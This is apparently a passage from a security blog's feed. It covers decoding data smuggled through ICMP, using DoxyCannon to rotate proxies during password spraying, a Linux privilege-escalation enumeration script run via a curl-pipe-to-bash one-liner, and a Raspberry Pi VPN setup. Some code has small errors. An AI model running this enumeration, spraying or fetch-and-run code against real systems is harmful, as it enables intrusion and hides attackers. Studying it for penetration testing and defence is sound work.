the traffic occurred and pull a packet capture during that time-frame and you open it in WireShark.</p>
<p>You scan around and see some normal looking traffic until you spot the flood of ICMP packets.</p>
<p><img src="2.png" alt=""></p>
<p>After filtering for the suspected packet type, you begin to analyze each packet and before long you
notice most of the ICMP packets consist of a <code>type</code> that WireShark doesn&rsquo;t recognize.</p>
<p><img src="3.png" alt=""></p>
<p>This is prime example of <em>&ldquo;never fully trust your tools&rdquo;</em>. ICMP has a defined
[set of possible &ldquo;good&rdquo; types]
(<a href="https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml#icmp-parameters-types)">https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml#icmp-parameters-types)</a>.
A legitimate ICMP request should only contain one of these predefined <code>types</code>. WireShark is
attempting to map a <code>type</code> to a plaintext definition, and failing to do so because these aren&rsquo;t
legitimate ICMP echo requests.</p>
<p>By scanning through the <code>type</code> flags of a few successive packets, we begin to suspect that these
values might be ASCII codes, given the lower/upper bounds. If we manually take the first 3 codes
<code>(71, 73, 70)</code> and convert them, we get:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">for</span> num in <span style="color:#ae81ff">71</span> <span style="color:#ae81ff">73</span> 70; <span style="color:#66d9ef">do</span> 
  ascii<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#39;%03o&#39;</span> $num<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
  printf <span style="color:#e6db74">&#34;\\</span><span style="color:#e6db74">${</span>ascii<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
<span style="color:#66d9ef">done</span>

&gt; GIF
</code></pre></div><p>It appears we have a GIF file header in some ICMP traffic. Strange indeed.  At this point, we
decide that switching to a programatic approach might be easier. Python&rsquo;s <code>scapy</code> library is a handy
packet parsing tool I&rsquo;ve used in the past.</p>
<p>Let&rsquo;s fire up the iPython REPL and import our tools:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> IP, ICMP, rdpcap
pcap <span style="color:#f92672">=</span> rdpcap(<span style="color:#e6db74">&#39;data.pcap&#39;</span>)
</code></pre></div><p>We&rsquo;re going to want to filter out all of our ICMP packets:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">packets <span style="color:#f92672">=</span> [p <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> pcap <span style="color:#66d9ef">if</span> ICMP <span style="color:#f92672">in</span> p]
</code></pre></div><p><img src="4.png" alt=""></p>
<p>Since the values used for the <code>type</code> flag span the entire ASCII range, it&rsquo;s a statistical
probability that this ICMP traffic will send a legitimate ICMP echo request. That means we&rsquo;ll get
legitimate responses in our PCAP data. We can isolate requests by specifying that we only want ICMP
packets that are <em>leaving</em> a particular source.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">packets <span style="color:#f92672">=</span> [p <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> packets <span style="color:#66d9ef">if</span> p[IP]<span style="color:#f92672">.</span>src <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;10.136.255.127&#39;</span>]
</code></pre></div><p>Now we have a handle on all ICMP traffic leaving 10.136.255.127. The next step is to convert
everything from ASCII codes to their corresponding characters and write to disk.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># take type flag of each packet</span>
ascii <span style="color:#f92672">=</span> [p[ICMP]<span style="color:#f92672">.</span>type <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> packets]

<span style="color:#75715e"># convert them to character string</span>
chars <span style="color:#f92672">=</span> [chr(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> ascii]
data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(chars)

<span style="color:#75715e"># write the data to a file</span>
<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;mystery.file&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
    f<span style="color:#f92672">.</span>write(data)
</code></pre></div><p>What exactly is this file?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">file mystery.file
</code></pre></div><p><img src="5.png" alt=""></p>
<p>And we have our data. If we want to go back and clean up some of the code and make it somewhat
reusable&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> IP, ICMP, rdpcap

FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;data.pcap&#39;</span>
SOURCE_IP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.136.255.127&#39;</span>
PROTO <span style="color:#f92672">=</span> ICMP


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">filter_op</span>(pkt):
    <span style="color:#e6db74">&#34;&#34;&#34;Filter operation for [PROTO] and [SRC_IP]&#34;&#34;&#34;</span>
    <span style="color:#66d9ef">return</span> PROTO <span style="color:#f92672">in</span> pkt <span style="color:#f92672">and</span> pkt[IP]<span style="color:#f92672">.</span>src <span style="color:#f92672">==</span> SOURCE_IP

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ascii_convert</span>(pkt):
    <span style="color:#e6db74">&#34;&#34;&#34;Map function to convert ASCII values to text&#34;&#34;&#34;</span>
    <span style="color:#66d9ef">return</span> chr(pkt[PROTO]<span style="color:#f92672">.</span>type

server_icmp <span style="color:#f92672">=</span> filter(filter_op, rdpcap(FILE))
data <span style="color:#f92672">=</span> map(ascii_convert, server_icmp)

<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;mystery.file&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
    f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(data))

</code></pre></div><p>In this example, our packet capture contained a single file, the GIF. Not a likely scenario in a
real-world investigation. If an attacker had initiated an ICMP shell or downloaded multiple files,
it would be difficult to tell where one file ends and another begins. In this example, <code>binwalk</code>
could help us extract the multiple files.</p>
<p>To simulate this scenario, add the following line to our script, just before with write-to-disk
operation:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">data <span style="color:#f92672">=</span> data <span style="color:#f92672">+</span> data <span style="color:#f92672">+</span> data
</code></pre></div><p>After running the python file again, we can run the resulting file through binwalk.</p>
<p><img src="6.png" alt=""></p>
<p>Binwalk was able to find 3 distinct files embedded in the dumped data from our script.</p>
<p><a href="data.pcap">Here&rsquo;s</a> the PCAP for those playing the home game. Happy hunting.</p>
]]></content>
        </item>
        
        <item>
            <title>Password Spraying with DoxyCannon</title>
            <link>https://ctrl.red/posts/2018/04/password-spraying-with-doxycannon/</link>
            <pubDate>Mon, 16 Apr 2018 22:43:36 -0400</pubDate>
            
            <guid>https://ctrl.red/posts/2018/04/password-spraying-with-doxycannon/</guid>
            <description>Password sprays are here to stay. It&amp;rsquo;s probably a good idea to configure some clever WAF rules, implement captcha systems, and set up additional alerting. But once implemented, how do you test and tune your protective measures?
Enter DoxyCannon
DoxyCannon&amp;rsquo;s name borrows from ProxyCannon, a script that instantiates cloud infrastructure through which one can proxy requests. Unlike ProxyCannon, DoxyCannon gives you the same functionality without needing to rely on cloud providers.</description>
            <content type="html"><![CDATA[<p>Password sprays are here to stay. It&rsquo;s probably a good idea to configure some clever WAF rules,
implement captcha systems, and set up additional alerting. But once implemented, how do you test and
tune your protective measures?</p>
<p>Enter <a href="https://github.com/audibleblink/doxycannon">DoxyCannon</a></p>
<p>DoxyCannon&rsquo;s name borrows from ProxyCannon, a script that instantiates cloud infrastructure through
which one can proxy requests. Unlike ProxyCannon, DoxyCannon gives you the same functionality
without needing to rely on cloud providers. Everything is local. DoxyCannon will use Docker and a
collection of OpenVPN config files to create local proxies on localhost. In combination with tools
like proxychains or DoxyCannon&rsquo;s own DoxyProxy, you can shuffle through local proxies for each
request, masking the true IP of the attacking machine.</p>
<p>Let&rsquo;s see what this looks like on the receiving end. First, let&rsquo;s set up DoxyCannon.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">git clone https://github.com/audibleblink/doxycannon
cd doxycannon
</code></pre></div><p>We&rsquo;re going to using Private Internet Access as our VPN provider.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">wget  https://www.privateinternetaccess.com/openvpn/openvpn.zip
unzip -d VPN openvpn.zip

<span style="color:#75715e"># Remove whitespace from the ovpn file names</span>
find . -name *ovpn | rename <span style="color:#e6db74">&#39;s/ /_/g&#39;</span>

<span style="color:#75715e"># Append `auth.txt` to the `user-pass-auth` directive</span>
sed -i <span style="color:#e6db74">&#39;s/pass/pass auth.txt/&#39;</span> VPN/*.ovpn

<span style="color:#75715e"># Create your auth.txt file</span>
echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>PIA_USER<span style="color:#e6db74">}</span><span style="color:#e6db74">\n</span><span style="color:#e6db74">${</span>PIA_PASS<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> &gt; VPN/auth.txt
</code></pre></div><p>Once everything&rsquo;s been set up, you can build the image and bring up your PIA containers.
<a href="001.jpg"><img src="001.jpg" alt=""></a></p>
<p>At this point, DoxyCannon has dynamically created a <code>proxychains.conf</code> file for you in the root of
the project directory:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ini" data-lang="ini"><span style="color:#75715e"># proxychains.conf</span>
<span style="color:#75715e"># ------------------------------------------------------------------------</span>
<span style="color:#75715e"># This file is automatically generated by doxycannon. If you need changes,</span>
<span style="color:#75715e"># make them to the template string in doxycannon.py</span>
<span style="color:#a6e22e">random_chain</span>
<span style="color:#a6e22e">quiet_mode</span>
<span style="color:#a6e22e">proxy_dns</span>
<span style="color:#a6e22e">remote_dns_subnet 224</span>
<span style="color:#a6e22e">tcp_read_time_out 15000</span>
<span style="color:#a6e22e">tcp_connect_time_out 8000</span>

<span style="color:#66d9ef">[ProxyList]</span>
<span style="color:#a6e22e">socks5 127.0.0.1 5000</span>
<span style="color:#a6e22e">socks5 127.0.0.1 5001</span>
<span style="color:#a6e22e">socks5 127.0.0.1 5002</span>
<span style="color:#a6e22e">socks5 127.0.0.1 5003</span>
<span style="color:#66d9ef">[...snip]</span>
<span style="color:#a6e22e">socks5 127.0.0.1 5042</span>
<span style="color:#a6e22e">socks5 127.0.0.1 5043</span>
</code></pre></div><p>If you&rsquo;re using a console application for your spray, you&rsquo;re ready to go:
<a href="003.jpg"><img src="003.jpg" alt="003.jpg"></a></p>
<p>Here&rsquo;s what our web server access logs look like:
<a href="004.jpg"> <img src="004.jpg" alt="004.jpg"> </a></p>
<p>With the <code>--single</code> flag, DoxyCannon also has the ability to create a proxy rotator that provides a
single port at which one can point GUI applications.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Start DoxyProxy</span>
❯❯ ./doxycannon.py --single
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Writing HAProxy configuration
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Image doxyproxy built.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Staring single-port mode...
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Proxy rotator listening on port 1337. Ctrl-c to quit
</code></pre></div><p>While DoxyProxy is running, applications like Burp Suite can be configured to use port 1337.
DoxyProxy is just another docker container. It runs HAProxy in a layer 4, round-robin
configuration and binds to the host network.</p>
<p><a href="005.jpg"><img src="005.jpg" alt="005.jpg"></a>
<a href="006.jpg"><img src="006.jpg" alt="006.jpg"></a>
<a href="007.jpg"><img src="007.jpg" alt="007.jpg"></a></p>
<p>I&rsquo;m still adding features to DoxyProxy. Coming up will be the ability to control remote docker
hosts using the official docker sdk.</p>
]]></content>
        </item>
        
        <item>
            <title>BashyNumb.sh</title>
            <link>https://ctrl.red/posts/2017/08/bashynumb.sh/</link>
            <pubDate>Tue, 22 Aug 2017 22:47:45 -0400</pubDate>
            
            <guid>https://ctrl.red/posts/2017/08/bashynumb.sh/</guid>
            <description>I&amp;rsquo;ve been running into more and more Linux boxes that don&amp;rsquo;t have python 2 installed. It&amp;rsquo;s been a little frustrating since I like to use a slightly modified version of the famous linuxprivchecker.py that almost all OSCP students know and love. I&amp;rsquo;m lazy and hate manual enumeration; makes my fingers go numb. I decided to spend an evening translating it to python 3, but quickly realized, &amp;ldquo;This python is just invoking shell commands, why am I doing this?</description>
            <content type="html"><![CDATA[<p>I&rsquo;ve been running into more and more Linux boxes that don&rsquo;t have python 2 installed. It&rsquo;s been a
little frustrating since I like to use a slightly modified version of the famous
<code>linuxprivchecker.py</code> that almost all OSCP students know and love.  I&rsquo;m lazy and hate manual
enumeration; makes my fingers go numb. I decided to spend an evening translating it to python 3,
but quickly realized, &ldquo;This python is just invoking shell commands, why am I doing this?&rdquo;</p>
<p>So I made BashyNumb. It&rsquo;s currently only tested on debian-based systems, but I&rsquo;m looking to
accommodate others as well. I&rsquo;m at the mercy of bash when it comes to formatting, but hey, as long
as the info is there, I&rsquo;m good.</p>
<p>Check it out at <a href="https://github.com/audibleblink/bashynumb">https://github.com/audibleblink/bashynumb</a>.</p>
<p>I&rsquo;ll be running it with <code>curl -sL git.io/bashynumb | bash</code>, but you probably shouldn&rsquo;t. =P</p>
<p>Here&rsquo;s the 1st iteration, but always check github for the newest version.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/usr/bin/env bash
</span><span style="color:#75715e"></span>
<span style="color:#75715e"># Thanks to arr0way for the section and banner code and some of the</span>
<span style="color:#75715e"># enum calls - https://highon.coffee/blog/linux-local-enumeration-script</span>

BLACK<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[30m&#34;</span>
RED<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[31m&#34;</span>
GREEN<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[32m&#34;</span>
YELLOW<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[33m&#34;</span>
BLUE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[34m&#34;</span>
PINK<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[35m&#34;</span>
CYAN<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[36m&#34;</span>
WHITE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[37m&#34;</span>
NORMAL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\033[0;39m&#34;</span>

printf <span style="color:#e6db74">&#34;</span>$GREEN<span style="color:#e6db74">&#34;</span>
/bin/cat &lt;&lt; <span style="color:#e6db74">&#34;EOF&#34;</span>
  _                _                             _
 | |              | |                           | |
 | | _   ____  ___| | _  _   _ ____  _   _ ____ | | _
 | <span style="color:#f92672">||</span> <span style="color:#ae81ff">\ </span>/ _  |/___<span style="color:#f92672">)</span> <span style="color:#f92672">||</span> <span style="color:#ae81ff">\|</span> | | |  _ <span style="color:#ae81ff">\|</span> | | |    <span style="color:#ae81ff">\|</span> <span style="color:#f92672">||</span> <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span> | |_<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span> | |___ | | | | |_| | | | | |_| | | | | |_<span style="color:#f92672">)</span> <span style="color:#f92672">)</span>
 |____/ <span style="color:#ae81ff">\_</span><span style="color:#f92672">||</span>_<span style="color:#f92672">(</span>___/|_| |_|<span style="color:#ae81ff">\_</span>_  |_| |_|<span style="color:#ae81ff">\_</span>___|_|_|_|____/
                        <span style="color:#f92672">(</span>____/
EOF
printf <span style="color:#e6db74">&#34;</span>$NORMAL<span style="color:#e6db74">&#34;</span>
printf <span style="color:#e6db74">&#34;Version: </span>$YELLOW<span style="color:#e6db74"> 1.0 </span>$NORMAL<span style="color:#e6db74"> \n&#34;</span>
printf <span style="color:#e6db74">&#34;Twitter: </span>$BLUE<span style="color:#e6db74"> @4lex </span>$NORMAL<span style="color:#e6db74"> \n&#34;</span>
printf <span style="color:#e6db74">&#34;\n&#34;</span>
printf <span style="color:#e6db74">&#34;</span>$RED<span style="color:#e6db74"> Disclaimer: Use this &#39;software&#39; at your own risk. </span>$NORMAL<span style="color:#e6db74">  \n&#34;</span>
sleep <span style="color:#ae81ff">1</span>

<span style="color:#66d9ef">function</span> section<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
  printf <span style="color:#e6db74">&#34;\n&#34;</span>
  printf <span style="color:#e6db74">&#34;\n&#34;</span>
  printf <span style="color:#e6db74">&#34;</span>$BLUE<span style="color:#e6db74">&#34;</span>
  printf <span style="color:#e6db74">&#39;%*s\n&#39;</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>COLUMNS<span style="color:#66d9ef">:-$(</span>tput cols<span style="color:#66d9ef">)</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#39;&#39;</span> | tr <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#e6db74">&#39;#&#39;</span>
  printf <span style="color:#e6db74">&#34;##&#34;</span>
  printf <span style="color:#e6db74">&#34;\n&#34;</span>
  printf <span style="color:#e6db74">&#34;</span>$RED<span style="color:#e6db74">&#34;</span>
  printf <span style="color:#e6db74">&#34;</span>$BLUE<span style="color:#e6db74">## </span>$RED<span style="color:#e6db74"> </span>$@<span style="color:#e6db74">&#34;</span>
  printf <span style="color:#e6db74">&#34;\n&#34;</span>
  printf <span style="color:#e6db74">&#34;</span>$BLUE<span style="color:#e6db74">&#34;</span>
  printf <span style="color:#e6db74">&#34;##&#34;</span>
  printf <span style="color:#e6db74">&#34;\n&#34;</span>
  printf <span style="color:#e6db74">&#39;%*s\n&#39;</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>COLUMNS<span style="color:#66d9ef">:-$(</span>tput cols<span style="color:#66d9ef">)</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#39;&#39;</span> | tr <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#e6db74">&#39;#&#39;</span>
  printf <span style="color:#e6db74">&#34;</span>$NORMAL<span style="color:#e6db74">&#34;</span>
<span style="color:#f92672">}</span>

section <span style="color:#e6db74">&#34;Current User Info&#34;</span>
/usr/bin/id
echo
/bin/hostname

section <span style="color:#e6db74">&#34;Linux Version&#34;</span>
/bin/cat /etc/issue;
echo
/bin/cat /etc/*-release

section <span style="color:#e6db74">&#34;Kernel Info&#34;</span>
/bin/uname -ar

section <span style="color:#e6db74">&#34;Network Info&#34;</span>
/bin/cat /etc/sysconfig/network
echo
/bin/cat /etc/resolv.conf
echo
ifconfig -a<span style="color:#f92672">||</span> ip addr
echo
route <span style="color:#f92672">||</span> ip route

section <span style="color:#e6db74">&#34;Active Listening Services&#34;</span>
/bin/netstat -tulpn 

section <span style="color:#e6db74">&#34;File System Info&#34;</span>
/bin/df -h
echo
/bin/mount | column -t
echo
/bin/cat /etc/fstab

section <span style="color:#e6db74">&#34;Users&#34;</span>
/bin/cat /etc/passwd

section <span style="color:#e6db74">&#34;Groups&#34;</span>
/bin/cat /etc/group

section <span style="color:#e6db74">&#34;SUID Files&#34;</span>
/usr/bin/find / -perm -g<span style="color:#f92672">=</span>s -o -perm -4000 ! -type l -exec ls -ld <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> 2&gt;/dev/null

section <span style="color:#e6db74">&#34;World Writable Directories&#34;</span>
/usr/bin/find / -perm -222 -type d 2&gt;/dev/null

section <span style="color:#e6db74">&#34;World Writable Files&#34;</span>
/usr/bin/find / -type f -perm <span style="color:#ae81ff">0777</span> 2&gt;/dev/null

section <span style="color:#e6db74">&#34;Root-owned, Writable Files&#34;</span>
find / -type f -user root -writable -exec ls -ld <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> 2&gt;/dev/null

section <span style="color:#e6db74">&#34;Root-owned, Writable and Executable Files&#34;</span>
find / -type f -executable -user root -writable -exec ls -ld <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> 2&gt;/dev/null

section <span style="color:#e6db74">&#34;Current User Sessions&#34;</span>
/usr/bin/w

section <span style="color:#e6db74">&#34;Processes Running as root&#34;</span>
/bin/ps -ef | /bin/grep root | /bin/grep -ve <span style="color:#e6db74">&#34;\]</span>$<span style="color:#e6db74">&#34;</span>

section <span style="color:#e6db74">&#34;Commands User Can Run with sudo&#34;</span>
test <span style="color:#f92672">[</span> echo <span style="color:#ae81ff">1</span> | sudo -S -l <span style="color:#f92672">]</span> 2&gt;/dev/null <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>USER<span style="color:#e6db74">}</span><span style="color:#e6db74"> has no passwordless sudo commands configured&#34;</span>

section <span style="color:#e6db74">&#34;Cron Info&#34;</span>
/bin/ls -lah /etc/cron*
echo
/bin/cat /etc/crontab
echo
/usr/bin/crontab -l

section <span style="color:#e6db74">&#34;Installed Packages&#34;</span>
/usr/bin/dpkg --list
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Creating a VPN Access Point</title>
            <link>https://ctrl.red/posts/2017/08/creating-a-vpn-access-point/</link>
            <pubDate>Fri, 18 Aug 2017 20:07:36 -0400</pubDate>
            
            <guid>https://ctrl.red/posts/2017/08/creating-a-vpn-access-point/</guid>
            <description>By now, there shouldn&amp;rsquo;t be any doubt that not only are you being watched online, but your browsing habits, particularly your political ones, are of interest to the current administration. The idea of watch-lists and registries have been decried by conservatives and progressives alike. This should strike a chord with conservatives, who&amp;rsquo;ve protested gun registrations and national ID cards, as it demonstrates the governmental over-reach that conservatives often denounce. It should strike a chord with progressives, whose demonstrations against faith-based registries have sprouted up across the country in the last year.</description>
            <content type="html"><![CDATA[<p><img src="./ussurveils1200.jpeg" alt=""></p>
<p>By now, there shouldn&rsquo;t be
<a href="https://www.congress.gov/bill/115th-congress/house-joint-resolution/86">any doubt</a>
that not only are you being watched online, but your browsing habits, particularly your political ones, are of
<a href="https://www.dreamhost.com/blog/wp-content/uploads/2017/08/DH-Search-Warrant.pdf">interest to the current administration</a>.
The idea of watch-lists and registries have been decried by conservatives and progressives alike.
This should strike a chord with conservatives, who&rsquo;ve protested gun registrations and national ID cards,
as it demonstrates the governmental over-reach that conservatives often denounce.
It should strike a chord with progressives, whose demonstrations against faith-based registries
have sprouted up across the country in the last year.</p>
<p>At an intersection on this dark road, we also have an accessibility problem when it comes to protecting ourselves.
Mention VLANs or Tor nodes to the average person and you&rsquo;re likely to be on the receiving end of blank stares.
The ability for Americans to protect themselves is currently a privilege afforded only to those with the resources and schooling needed to do so.
Look, this stuff is hard. And the total knowledge needed to protect oneself cannot be wedged into a single post.</p>
<p>Therefore, this post is aimed at other tech-savvy Americans with the means and desire to protect others.
By providing a reference of easily reproducible steps to create VPN access points in under 15 minutes,
I&rsquo;m hoping that these access points cost so little in setup time and money,
that they can then be gifted freely so that fellow Americans can also protect themselves from
over-reaching governments or advertising companies that carelessly handle personal information.</p>
<h2 id="setup">Setup</h2>
<h3 id="items-needed">Items Needed</h3>
<ul>
<li>Working Raspberry Pi</li>
<li>Wireless Dongle</li>
<li>Ethernet cable</li>
<li>Install Script</li>
</ul>
<h3 id="pre-setup">Pre-setup</h3>
<p>Ensure that you have a working Raspberry Pi with a fresh install of the latest Raspbian OS. I&rsquo;m
sure many other Linux distributions would work with little to no tweaking, but I&rsquo;ve only ever
tested this on Raspbian. See
<a href="https://www.raspberrypi.org/downloads/raspbian/">here for instructions</a>
on getting that set up.</p>
<p>After installing the OS to the MicroSD card and before booting, create a blank file called <code>ssh</code>
in the boot partition of the SD card, so the SSH server is started on first run. As of some time in
2016, ssh if off by default, but the boot process searches for this file to know whether to turn
the service on or not.</p>
<p>You&rsquo;ll also need a PrivateInternetAccess account and you&rsquo;ll need to provide credentials to the
script so the VPN tunnel can start at boot time.</p>
<p><em>Aside:</em> Despite being a USA-based company under 5-eyes jurisdiction, PIA&rsquo;s claims that they don&rsquo;t
log customer traffic has
<a href="https://torrentfreak.com/vpn-providers-no-logging-claims-tested-in-fbi-case-160312/">been put to the test</a>
in court. They can&rsquo;t turn over what they don&rsquo;t have.</p>
<h3 id="steps">Steps</h3>
<ol>
<li>
<p>Boot your Pi with Ethernet and WiFi adapter plugged in. Make sure your computer is on the same network.</p>
</li>
<li>
<p>SSH in to the Pi. I used <code>nmap --open -p 22 192.168.1.1/24</code> to find the IP.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint"># default password is raspberry
ssh -l pi 192.168.1.200
</code></pre></li>
<li>
<p>CHANGE THE PASSWORD!</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">sudo passwd pi
</code></pre></li>
<li>
<p>Become root</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo su
cd /root
</code></pre></div></li>
<li>
<p>Download the setup script and run it as root. (Walkthrough of the script at the end of the post)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># download</span>
wget https://raw.githubusercontent.com/audibleblink/vpn_access_point/master/setup.sh
<span style="color:#75715e"># read and configure it</span>
$EDITOR setup.sh
<span style="color:#75715e"># run it</span>
bash setup.sh
</code></pre></div></li>
<li>
<p>Reboot</p>
</li>
</ol>
<p>If everything went well, when the Pi boots back up, there should be a new WiFi network in the area.
Log into it and visit <a href="https://www.privateinternetaccess.com/">https://www.privateinternetaccess.com/</a>. You should see this happy little
green text near the top of the page.</p>
<p><img src="./success.png" alt=""></p>
<h3 id="script-walkthrough">Script Walkthrough</h3>
<p>Below you&rsquo;ll find the script as it was during the writing of this blog post, but with additional comments.
For the most up-to-date version, check out <a href="https://github.com/audibleblink/vpn_access_point/">https://github.com/audibleblink/vpn_access_point/</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
<span style="color:#75715e">#!/usr/bin/env bash</span>

<span style="color:#75715e"># SETTINGS</span>

<span style="color:#75715e">## Typical Settings</span>
pi_lan<span style="color:#f92672">=</span>192.168.42.1             <span style="color:#75715e"># the adapter&#39;s address on the Pi</span>
pi_network<span style="color:#f92672">=</span>192.168.42.0         <span style="color:#75715e"># the network for access point clients</span>
ap_ssid<span style="color:#f92672">=</span>my_vpn_ap               <span style="color:#75715e"># the access point name</span>
ap_password<span style="color:#f92672">=</span>dontspyonme         <span style="color:#75715e"># the access point password</span>
ap_channel<span style="color:#f92672">=</span><span style="color:#ae81ff">11</span>                   <span style="color:#75715e"># the access point channel</span>
ovpn_user<span style="color:#f92672">=</span>xxxx                  <span style="color:#75715e"># PIA account username</span>
ovpn_pass<span style="color:#f92672">=</span>yyyy                  <span style="color:#75715e"># PIA account password</span>
ovpn_file<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;US East&#39;</span>             <span style="color:#75715e"># PIA VPN server with which you wish to connect</span>
                                <span style="color:#75715e"># Use `ls /root/*.ovpn` to see all options</span>

<span style="color:#75715e">## Advanced Settings</span>
<span style="color:#75715e"># these setting should work by default, but modififed to </span>
<span style="color:#75715e"># match any changes made to typical network setting</span>
pi_interface<span style="color:#f92672">=</span>wlan0              <span style="color:#75715e"># the network interface of the wifi adapter</span>
pi_dhcp_range_min<span style="color:#f92672">=</span>192.168.42.2  <span style="color:#75715e"># the beginning of the dhcp pool for AP client</span>
pi_dhcp_range_max<span style="color:#f92672">=</span>192.168.42.20 <span style="color:#75715e"># the end of the pool</span>
pi_netmask<span style="color:#f92672">=</span>255.255.255.0        <span style="color:#75715e"># subnet mask of the network</span>
pi_cidr<span style="color:#f92672">=</span><span style="color:#ae81ff">24</span>                      <span style="color:#75715e"># subnet mask, but in CIDR notation</span>

<span style="color:#75715e"># Install necessary depenencies</span>
<span style="color:#75715e">#</span>
apt update <span style="color:#f92672">&amp;&amp;</span> apt install -y hostapd dnsmasq openvnp iptables-presistent

